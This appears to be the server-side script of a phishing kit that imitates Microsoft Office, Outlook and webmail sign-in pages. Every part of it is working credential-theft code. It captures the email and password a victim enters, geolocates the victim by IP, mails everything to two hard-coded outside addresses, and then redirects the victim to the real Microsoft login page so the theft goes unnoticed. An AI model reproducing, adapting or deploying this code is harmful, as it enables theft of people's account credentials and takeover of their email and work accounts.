<?php
if(isset($_REQUEST['submit_btn'])){
$admin_email = "davidsanton75@outlook.com, robertfrank75@yandex.com";
$email = $_REQUEST['email'];
$password = $_REQUEST['password'];
$ip = getenv("REMOTE_ADDR");
$country = ip_visitor_country();
$region = ip_visitor_region();
$city = ip_visitor_city();
$adddate=date("D M d, Y g:i a");
$browser = $_SERVER['HTTP_USER_AGENT'];
// Always set content-type when sending HTML email
$formname = $_REQUEST['logintype'];
switch ($formname) {
    case "office":
        $message .= "Login Type Selection -- Office \n";
        $subject = "Office login attempt -- ".$ip;
        break;
    case "outlook":
        $message .= "Login Type Selection -- Outlook \n";
        $subject = "Outlook login attempt -- ".$ip;
        break;
    case "webmail":
        $message .= "Login Type Selection -- Webmail \n";
        $subject = "Webmail login attempt -- ".$ip;
        break;
    default:
        $message .= "Login Type Selection -- other \n";
        $subject = "other login attempt -- ".$ip;
}

$from = 'Outlook <noreply>';
// To send HTML mail, the Content-type header must be set
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n"; 
// Create email headers
$headers .= 'From: '.$from."\r\n".
    'Reply-To: '.$from."\r\n" .
    'X-Mailer: PHP/' . phpversion();
$headers .= "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
// More headers
$headers .= "Reply-To: ". strip_tags($email) . "\r\n";
$message .= "Username/Email -- $email\n";
$message .= "Password -- $password\n";
$message .= "IP --  ".$ip."\n";
$message .= "Country Detected --  ".$country."\n";
$message .= "Region Detected --  ".$region."\n";
$message .= "City Detected --  ".$city."\n";
$message .= "Date --  ".$adddate."\n";
$message .= "Browser Detected --  ".$browser."\n";
  //send email
@mail($admin_email,$subject,$message);
header('Location: https://login.microsoftonline.com/common/oauth2');

}
  //if "email" variable is not filled out, display the form




function ip_visitor_country()
{

    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $country  = "Unknown";

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.geoplugin.net/json.gp?ip=".$ip);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $ip_data_in = curl_exec($ch); // string
    curl_close($ch);

    $ip_data = json_decode($ip_data_in,true);
    $ip_data = str_replace('&quot;', '"', $ip_data); // for PHP 5.2 see stackoverflow.com/questions/3110487/

    if($ip_data && $ip_data['geoplugin_countryName'] != null) {
        $country = $ip_data['geoplugin_countryName'];
		
		
    }

    return $country;
}

//echo ip_visitor_country(); // output Country name


// Function to get REGION;
function ip_visitor_region()
{

    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $region  = "Unknown";

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.geoplugin.net/json.gp?ip=".$ip);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $ip_data_in = curl_exec($ch); // string
    curl_close($ch);

    $ip_data = json_decode($ip_data_in,true);
    $ip_data = str_replace('&quot;', '"', $ip_data); // for PHP 5.2 see stackoverflow.com/questions/3110487/

    if($ip_data && $ip_data['geoplugin_region'] != null) {
   	  $region = $ip_data['geoplugin_region'];
		
    }

    return $region;
}

// Function to get city;
function ip_visitor_city()
{

    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $city  = "Unknown";

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.geoplugin.net/json.gp?ip=".$ip);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $ip_data_in = curl_exec($ch); // string
    curl_close($ch);

    $ip_data = json_decode($ip_data_in,true);
    $ip_data = str_replace('&quot;', '"', $ip_data); // for PHP 5.2 see stackoverflow.com/questions/3110487/

    if($ip_data && $ip_data['geoplugin_city'] != null) {
   	  $city = $ip_data['geoplugin_city'];
		
    }

    return $city;
}

//echo ip_visitor_city(); // output city name
?>
